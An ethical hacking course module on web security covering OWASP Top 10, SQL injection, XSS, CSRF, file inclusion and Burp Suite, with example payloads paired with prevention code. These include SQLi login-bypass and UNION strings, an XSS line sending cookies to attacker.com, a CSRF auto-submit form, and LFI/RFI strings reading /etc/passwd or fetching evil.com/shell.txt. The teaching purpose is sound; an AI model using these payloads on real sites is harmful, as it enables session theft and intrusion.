# 🛡️ Ethical Hacking Course - Module 7
## Web Application Security

---

## 7.1 OWASP Top 10

### The Most Critical Web Security Risks

| Rank | Vulnerability | Risk |
|------|--------------|------|
| 1 | Injection | Critical |
| 2 | Broken Auth | High |
| 3 | Sensitive Data Exposure | Critical |
| 4 | XML External Entities | High |
| 5 | Broken Access Control | Critical |
| 6 | Security Misconfiguration | High |
| 7 | XSS | High |
| 8 | Insecure Deserialization | High |
| 9 | Using Components with Known Vulnerabilities | Medium |
| 10 | Insufficient Logging | Medium |

---

## 7.2 SQL Injection

### What is SQLi?
Attackers inject malicious SQL code into queries through user input.

### Types

```
1. In-Band SQLi
   ├── Union-based
   └── Error-based

2. Blind SQLi
   ├── Boolean-based
   └── Time-based
```

### Example Attack

```sql
-- Normal query
SELECT * FROM users WHERE username = 'admin' AND password = 'pass';

-- Malicious input
Username: admin'--
SELECT * FROM users WHERE username = 'admin'--' AND password = 'pass';

-- Union-based
Username: ' UNION SELECT username,password FROM users--
```

### Prevention

```sql
-- Use parameterized queries
PREPARE stmt FROM 'SELECT * FROM users WHERE username = ?';
SET @username = 'admin';
EXECUTE stmt USING @username;

-- Input validation
-- Use WAF (Web Application Firewall)
-- Least privilege database user
```

---

## 7.3 Cross-Site Scripting (XSS)

### Types

| Type | Description |
|------|-------------|
| Reflected | Payload in request, immediate response |
| Stored | Payload saved, displayed to others |
| DOM | Client-side code manipulation |

### Examples

```javascript
// Reflected XSS
https://vulnerable.com/search?q=<script>alert(1)</script>

// Stored XSS
<script>document.location='http://attacker.com?c='+document.cookie</script>

// DOM XSS
<img src=x onerror="alert(1)">
```

### Prevention

```javascript
// Output encoding
function escapeHTML(str) {
    return str.replace(/[&<>"']/g, 
        char => ({
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
        }[char])
    );
}

// Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self'

// HTTPOnly cookies
Set-Cookie: session=xyz; HttpOnly; Secure
```

---

## 7.4 CSRF (Cross-Site Request Forgery)

### How It Works

```
1. User logged into bank.com
2. Attacker sends malicious email
3. Email contains hidden form
4. Form submits transfer to attacker
5. Bank processes (cookies included)
```

### Example Attack

```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">

<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

### Prevention

```html
<!-- Anti-CSRF Token -->
<input type="hidden" name="csrf_token" value="abc123xyz">

<!-- SameSite Cookie -->
Set-Cookie: session=xyz; SameSite=Strict

<!-- Verify Origin -->
Origin: https://bank.com
Referer: https://bank.com/dashboard
```

---

## 7.5 File Inclusion

### Types

| Type | Description |
|------|-------------|
| LFI | Local File Inclusion - read local files |
| RFI | Remote File Inclusion - include remote files |

### Examples

```php
// Vulnerable code
<?php
include($_GET['page']);
?>

// Attack
?page=../../etc/passwd          // LFI
?page=http://evil.com/shell.txt  // RFI
```

### Prevention

```php
// Whitelist approach
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include("pages/$page.php");
} else {
    include("pages/404.php");
}

// Disable remote includes
allow_url_include = 0
```

---

## 7.6 Burp Suite Essentials

### Getting Started

```
1. Install Burp Suite
2. Configure browser proxy (127.0.0.1:8080)
3. Import CA certificate
4. Intercept requests
5. Analyze and modify
```

### Key Tools

| Tool | Purpose |
|------|---------|
| Proxy | Intercept traffic |
| Spider | Crawl website |
| Scanner | Find vulnerabilities |
| Repeater | Modify & resend requests |
| Intruder | Automate attacks |
| Decoder | Encode/decode data |

---

## 7.7 Web Security Checklist

### For Developers

- [ ] Input validation
- [ ] Output encoding
- [ ] Parameterized queries
- [ ] XSS protection
- [ ] CSRF tokens
- [ ] Secure headers
- [ ] File upload validation
- [ ] Rate limiting
- [ ] Error handling
- [ ] Logging & monitoring

### For Testers

- [ ] Map application
- [ ] Test authentication
- [ ] Test authorization
- [ ] Test input validation
- [ ] Test for injections
- [ ] Test for XSS
- [ ] Test file uploads
- [ ] Check SSL/TLS

---

## Key Takeaways

✅ OWASP Top 10 is essential
✅ SQL injection is dangerous
✅ XSS is everywhere
✅ Always validate input
✅ Use Burp Suite for testing

---

*Module 7 Complete! Next: Penetration Testing Methodology 🛡️*
